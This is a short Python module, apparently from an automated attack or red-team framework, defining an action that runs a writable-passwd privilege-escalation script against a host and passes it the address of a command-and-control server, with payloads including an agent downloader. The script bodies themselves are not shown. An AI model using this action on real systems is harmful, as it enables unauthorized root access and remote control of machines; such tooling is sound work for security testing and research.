import asyncio
from incalmo.core.actions.low_level_action import LowLevelAction
from incalmo.models.agent import Agent
from incalmo.core.models.events import Event
from incalmo.models.command_result import CommandResult
from incalmo.core.services.config_service import ConfigService


class WriteablePasswdExploit(LowLevelAction):
    def __init__(self, agent: Agent):
        server = ConfigService().get_config().agent_c2c_server
        command = f"bash writeable_passwd.sh {server}"
        payloads = ["downloadAgent.sh", "writeable_passwd.sh"]
        super().__init__(agent, command, payloads, command_delay=3)

    async def get_result(
        self,
        result: CommandResult,
    ) -> list[Event]:
        # sleep to allow for the agent to get to the new host
        await asyncio.sleep(10)
        return []
